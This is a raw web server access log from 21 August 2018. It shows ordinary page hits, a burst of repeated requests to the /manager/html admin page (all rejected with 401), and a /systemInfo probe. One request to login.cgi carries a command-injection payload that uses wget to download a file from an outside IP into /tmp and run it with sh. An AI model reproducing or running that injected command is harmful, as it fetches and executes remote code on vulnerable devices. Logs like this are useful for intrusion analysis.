216.218.206.69 - - [21/Aug/2018:00:38:57 +0000] "GET / HTTP/1.1" 200 11250
58.215.75.210 - - [21/Aug/2018:16:26:20 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:20 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:21 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:21 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:21 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:21 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:22 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:22 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:22 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:22 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:23 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:23 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:23 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:23 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:24 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:24 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:24 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:24 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:25 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:25 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:25 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:26 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:26 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:26 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:26 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:27 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:27 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:27 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:28 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:28 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:28 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:28 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:29 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:29 +0000] "GET /manager/html HTTP/1.1" 401 2473
58.215.75.210 - - [21/Aug/2018:16:26:29 +0000] "GET /manager/html HTTP/1.1" 401 2473
13.232.219.72 - - [21/Aug/2018:18:35:46 +0000] "GET /systemInfo HTTP/1.1" 404 1084
201.68.170.37 - - [21/Aug/2018:18:38:31 +0000] "GET / HTTP/1.1" 200 11250
27.79.248.164 - - [21/Aug/2018:22:06:26 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/xb;sh%20/tmp/xb%27$ HTTP/1.1" 400 1127
186.233.176.35 - - [21/Aug/2018:22:29:31 +0000] "GET / HTTP/1.1" 200 11250
176.221.24.139 - - [21/Aug/2018:22:58:48 +0000] "GET / HTTP/1.1" 200 11250
